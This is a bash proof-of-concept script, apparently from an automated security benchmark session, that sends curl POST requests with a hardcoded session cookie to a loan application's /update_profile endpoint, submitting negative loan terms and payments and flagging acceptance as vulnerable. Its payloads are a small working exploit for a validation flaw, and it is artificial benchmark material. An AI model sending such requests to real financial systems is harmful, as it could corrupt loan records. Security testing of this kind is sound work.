#!/bin/bash
# POC: Demonstrates business logic flaw allowing negative loan_term_months and monthly_payment values in POST /update_profile endpoint
# Target: ./repo
# Created: 2025-11-07T16:07:28.360Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# POC for Business Logic Flaw - Negative Loan Term Months and Monthly Payment
# Tests POST /update_profile endpoint for insufficient input validation

TARGET_URL="${1:-http://localhost}"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4YkA.lgLvgKVY8rtWUW99eOPGiw6Ot28"

echo "=========================================="
echo "Business Logic Flaw - Negative Loan Terms"
echo "=========================================="
echo ""
echo "[*] Target: $TARGET_URL/update_profile"
echo "[*] Testing negative loan_term_months and monthly_payment values..."
echo ""

# Test 1: Submit negative loan_term_months and monthly_payment
echo "[TEST 1] Submitting negative loan_term_months=-60 and monthly_payment=-100"
echo "Command: curl -s -b \"$SESSION_COOKIE\" -X POST $TARGET_URL/update_profile -d \"name=test&lastname=user&email=test@example.com&loan_amount=10000&loan_term_months=-60&monthly_payment=-100\""
echo ""

RESPONSE=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/update_profile" \
  -d "name=test&lastname=user&email=test@example.com&loan_amount=10000&loan_term_months=-60&monthly_payment=-100")

echo "Response:"
echo "$RESPONSE"
echo ""

# Check if negative values are accepted in response
if echo "$RESPONSE" | grep -q "\-60"; then
    echo "[✓] VULNERABLE: Negative loan_term_months (-60) was accepted"
    TERM_VULNERABLE=1
else
    echo "[✗] Negative loan_term_months not found in response"
    TERM_VULNERABLE=0
fi

if echo "$RESPONSE" | grep -q "\-100"; then
    echo "[✓] VULNERABLE: Negative monthly_payment (-100) was accepted"
    PAYMENT_VULNERABLE=1
else
    echo "[✗] Negative monthly_payment not found in response"
    PAYMENT_VULNERABLE=0
fi

echo ""

# Test 2: Submit very negative values
echo "[TEST 2] Submitting extreme negative values: loan_term_months=-999999 and monthly_payment=-5000"
echo "Command: curl -s -b \"$SESSION_COOKIE\" -X POST $TARGET_URL/update_profile -d \"name=test&lastname=user&email=test@example.com&loan_amount=10000&loan_term_months=-999999&monthly_payment=-5000\""
echo ""

RESPONSE2=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL/update_profile" \
  -d "name=test&lastname=user&email=test@example.com&loan_amount=10000&loan_term_months=-999999&monthly_payment=-5000")

echo "Response:"
echo "$RESPONSE2"
echo ""

if echo "$RESPONSE2" | grep -q "\-999999"; then
    echo "[✓] VULNERABLE: Extreme negative loan_term_months (-999999) was accepted"
elif echo "$RESPONSE2" | grep -q "\-999999\|negative"; then
    echo "[✓] VULNERABLE: Application accepted extreme negative value"
fi

if echo "$RESPONSE2" | grep -q "\-5000"; then
    echo "[✓] VULNERABLE: Extreme negative monthly_payment (-5000) was accepted"
fi

echo ""
echo "[SUMMARY]"
if [ "$TERM_VULNERABLE" -eq 1 ] || [ "$PAYMENT_VULNERABLE" -eq 1 ]; then
    echo "[CRITICAL] Application accepts negative loan terms and/or payment values"
    echo "This allows manipulation of financial calculations and potential data corruption"
    exit 0
else
    echo "[INFO] Could not confirm vulnerability through response parsing"
    echo "Manual inspection of response above recommended"
    exit 1
fi